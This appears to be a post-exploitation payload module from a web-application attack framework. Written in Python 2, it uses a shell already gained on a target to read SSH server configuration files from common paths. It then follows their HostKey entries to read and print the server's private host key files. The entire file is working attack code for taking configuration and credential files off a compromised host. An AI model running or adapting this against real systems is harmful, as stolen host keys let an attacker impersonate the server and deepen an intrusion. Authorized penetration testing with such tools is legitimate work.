import re
from plugins.attack.payloads.base_payload import base_payload

class ssh_config_files(base_payload):
    '''
    This payload shows SSH Server configuration files
    '''
    def api_read(self):
        result = {}
        files = []

        def parse_hostkey(config):
            hostkey = re.findall('(?<=HostKey )(.*)', config, re.MULTILINE)
            if hostkey:
                return hostkey
            else:
                return ''

        files.append('/etc/ssh/sshd_config')
        files.append('/etc/rssh.conf')
        files.append('/usr/local/etc/sshd_config')
        files.append('/etc/sshd_config')
        files.append('/etc/openssh/sshd_config')


        for file in files:
            hostkey = parse_hostkey(self.shell.read(file))
            for key in hostkey:
                files.append(key)

        for file in files:
            content = self.shell.read(file)
            if content:
                result.update({file:content})
        return result

    def run_read(self):
        hashmap = self.api_read()
        result = []
        if hashmap:
            result.append('SSH Config Files')
            for file, content in hashmap.iteritems():
                result.append('-------------------------')
                result.append(file)
                result.append('-------------------------')
                result.append(content)
        if result == [ ]:
            result.append('SSH configuration files not found.')
        return result
        
